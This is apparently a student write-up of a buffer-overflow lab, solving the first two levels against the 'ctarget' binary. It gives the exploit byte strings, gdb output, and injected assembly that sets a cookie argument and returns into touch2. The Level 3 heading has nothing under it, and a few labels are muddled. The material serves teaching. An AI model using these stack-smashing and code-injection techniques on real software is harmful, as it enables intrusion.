# Buffer Overflow Attack Notes

:dagger: => :computer:

## LEVEL 1

By testing how many bytes the `getbuf` can receive most, and reading the assembly code, we derive that it could take up to 55 characters wothout exiting abnormally.

The address of `touch1`: `00000000004016ed`. We need to insert it to `(%rsp)` right after it called `getbuf`.

The string we need to input in hex representation is shown below:

```txt
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 ed 16 40
```

Or... Add some magic.

```txt
54 68 65 20 62 69 67 20 62 72
6f 74 68 65 72 20 69 73 20 77
61 74 63 68 69 6e 67 20 68 69
6d 21 20 59 6f 75 27 6c 6c 20
62 65 20 73 65 6e 74 20 74 6f
20 31 30 31 2e 2e ed 16 40
```

By running the following command, we could input the target string to `stdin`:

```sh
./hex2raw < exploit.txt > exploit-raw.txt
./ctarget < exploit-raw.txt
```

We get the first hacking attempt done!

## Let's go to LEVEL 2

In this level. We have two things to do.

- Jump to cookie `0x4016d7`
- Change the parameter in touch2 to `cookie`

Find out the `%rsp` value in `getbuf`.

```sh
(gdb) b getbuf
Breakpoint 1 at 0x4016d7: file buf.c, line 12.
(gdb) run -q
Starting program: /mnt/c/star/computer-systems/target65/ctarget -q
Cookie: 0x110dfc17

Breakpoint 1, getbuf () at buf.c:12
(gdb) nexti
14      in buf.c
(gdb) disas
Dump of assembler code for function getbuf:
   0x00000000004016d7 <+0>:     sub    $0x38,%rsp
=> 0x00000000004016db <+4>:     mov    %rsp,%rdi
   0x00000000004016de <+7>:     callq  0x401927 <Gets>
   0x00000000004016e3 <+12>:    mov    $0x1,%eax
   0x00000000004016e8 <+17>:    add    $0x38,%rsp
   0x00000000004016ec <+21>:    retq   
End of assembler dump.
(gdb) p $rsp
$4 = (void *) 0x5567c608
```

`%rsp` in getbuf is `0x5567c608`.  
If `Gets` would return to it, we can inject exploit code in `%rsp` and then execute them.  
To call `touch2` while changing the parameter. We need to execute following instructions:

```s
mov $0x110dfc17, %rdi   # mov cookie to param1
pushq $0x40171b         # push address of touch2
ret
```

whose byte code is:

```s

asm-exploit.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 17 fc 0d 11 	mov    $0x110dfc17,%rdi
   7:	68 1b 17 40 00       	pushq  $0x40171b
   c:	c3                   	retq   
```

We need to inject these byte code to `%rsp` and overwrite the return address after 56 bytes.

```txt
48 c7 c7 17 fc 0d 11 68
1b 17 40 00 c3          /* exploit byte code, 13 bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00
08 c6 67 55             /* after Gets, return to %rsp, 4 bytes */
```

Also, adding some magic :joy:

```txt
48 c7 c7 17 fc 0d 11 68
1b 17 40 00 c3          /* exploit byte code, 13 bytes */
48 6f 70 65 2c 61 20 67 /* Hope,a good thing. No good things ever dies */
6f 6f 64 20 74 68 69 6e
67 2e 20 4e 6f 20 67 6f
6f 64 20 74 68 69 6e 67
73 20 65 76 65 72 20 64
69 65 73
08 c6 67 55             /* after Gets, return to %rsp, 4 bytes */
```

## LEVEL 3
